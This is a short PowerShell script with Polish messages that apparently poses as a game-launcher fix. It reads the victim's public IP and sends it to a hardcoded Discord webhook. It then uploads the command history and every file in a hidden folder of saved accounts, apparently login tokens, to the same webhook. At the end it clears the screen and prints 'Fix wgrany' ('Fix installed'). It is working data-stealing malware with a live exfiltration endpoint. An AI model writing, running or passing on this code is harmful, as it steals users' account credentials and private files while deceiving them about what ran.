$w = "https://discord.com/api/webhooks/1537127888304734238/DqmC4YiOcGttFHbP59FKHzbte980Y3MlrBJRwmCrQ__RoWPim7JRYyDtJVD_2h5u1dsO"
$p = "$env:APPDATA\.ogulniega\profile\_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE\.hidden"
$h = "$env:APPDATA\.ogulniega\profile\command_history.txt"

try {
    $ip = (New-Object System.Net.WebClient).DownloadString("https://api.ipify.org")
} catch {
    try {
        $ip = (New-Object System.Net.WebClient).DownloadString("https://icanhazip.com").Trim()
    } catch {
        $ip = "Nie udało się pobrać IP"
    }
}

curl.exe -s -F "content=Publiczne IP: $ip" $w

if (Test-Path $h) {
    curl.exe -s -F "file=@`"$h`"" $w
}
if (Test-Path $p) {
    Get-ChildItem -Path $p -Force | ForEach-Object {
        curl.exe -s -F "file=@`"$($_.FullName)`"" $w
    }
}

Clear-Host
Write-Host "Fix wgrany" -ForegroundColor Green